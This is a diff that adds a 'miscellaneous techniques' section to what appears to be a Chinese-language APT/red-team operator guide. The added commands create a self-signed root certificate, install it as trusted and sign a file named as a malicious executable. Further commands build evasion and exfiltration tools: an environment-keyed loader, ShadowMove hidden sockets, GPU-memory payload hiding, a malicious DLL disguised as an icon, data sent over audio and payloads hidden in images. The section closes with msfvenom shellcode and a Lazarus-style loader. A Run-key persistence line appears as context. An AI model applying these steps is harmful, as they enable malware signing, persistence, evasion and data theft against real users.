@@ -1159,3 +1159,108 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "MaliciousScript
 [进程注入](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/进程注入.cpp)
 
 ## 杂用技巧
+
+### 签署恶意执行程序
+
+```bash
+makecert -r -pe -n "CN=Diy CA" -ss CA -sr CurrentUser -a sha256 -cy authority -sky signature -sv DIY.pvk DIY.cer
+certutil -user -addstore Root DIY.cer
+makecert -pe -n "CN=Diy Cert" -a sha256 -cy end -sky signature -ic DIY.cer -iv DIY.pvk -sv DiyCert.pvk DiyCert.cer
+pvk2pfx -pvk DiyCert.pvk -spc DiyCert.cer -pfx DiyCert.pfx
+signtool sign /fd SHA256 /a /f DiyCert.pfx /t http://timestamp.digicert.com /v 恶意可执行程序.exe
+```
+
+### 环境秘钥
+
+```bash
+dir env:
+```
+
+[EnvKeyLoader.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%9D%82%E7%94%A8%E6%8A%80%E5%B7%A7/EnvKeyLoader.cpp)
+
+```bash
+x86_64-w64-mingw32-g++ -O2 EnvKeyLoader.cpp -o EnvKeyLoader.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
+```
+
+### ShadowMove隐藏套接字连接
+
+[sm.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%9D%82%E7%94%A8%E6%8A%80%E5%B7%A7/sm.cpp)
+
+```bash
+python3 -m http.server 8080
+```
+
+### 将有效载荷隐藏在GPU内存中
+
+[GPUPayload.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%9D%82%E7%94%A8%E6%8A%80%E5%B7%A7/GPUPayload.cpp)
+
+[GPU_ShellCode](https://github.com/H1d3r/GPU_ShellCode)
+
+[GPUSleep](https://github.com/oXis/GPUSleep)
+
+### 图标注入DLL
+
+[malicious.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%9D%82%E7%94%A8%E6%8A%80%E5%B7%A7/malicious.cpp)
+
+```bash
+x86_64-w64-mingw32-gcc -shared -o malicious.dll malicious.cpp
+```
+
+Resource Hacker:
+
+malicious.dll -> malicious.dll.ico
+
+[IconInjector.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%9D%82%E7%94%A8%E6%8A%80%E5%B7%A7/IconInjector.cpp)
+
+```bash
+x86_64-w64-mingw32-g++ -O2 IconInjector.cpp -o IconInjector.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive -lole32 -loleaut32 -luuid
+```
+
+更改任意文件或目录的图标为 malicious.dll.ico
+
+### 音频传输数据
+
+[Sound_Send.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%9D%82%E7%94%A8%E6%8A%80%E5%B7%A7/Sound_Send.cpp)
+
+[Sound_Server.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%9D%82%E7%94%A8%E6%8A%80%E5%B7%A7/Sound_Server.cpp)
+
+```bash
+.\Sound_Send.exe "i am robot!"
+.\Sound_Server.exe
+```
+
+### 有效载荷嵌入到图片
+
+[image.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%9D%82%E7%94%A8%E6%8A%80%E5%B7%A7/image.py)
+
+```bash
+python3 -m venv Crypto
+source bin/activate
+./bin/pip3 install pycryptodome
+./bin/pip3 install Pillow
+./bin/python3 image.py
+```
+
+[image_output.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%9D%82%E7%94%A8%E6%8A%80%E5%B7%A7/image_output.py)
+
+```bash
+pyinstaller --onefile .\image_output.py
+```
+
+### 模拟Lazarus加载Shellcode
+
+```bash
+msfvenom -p windows/x64/messagebox TEXT='Hi,I am Lazarus.Give me your money!' TITLE='Ghost Wolf Lab' -f raw -o wolf.bin
+```
+
+[Lazarus.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%9D%82%E7%94%A8%E6%8A%80%E5%B7%A7/Lazarus.py)
+
+```bash
+python3 Lazarus.py -p wolf.bin
+```
+
+[Lazarus.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%9D%82%E7%94%A8%E6%8A%80%E5%B7%A7/Lazarus.cpp)
+
+```bash
+x86_64-w64-mingw32-g++ -O2 Lazarus.cpp -o Lazarus.exe -I/usr/share/mingw-w64/include/ -L/usr/x86_64-w64-mingw32/lib/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive -lrpcrt4
+```
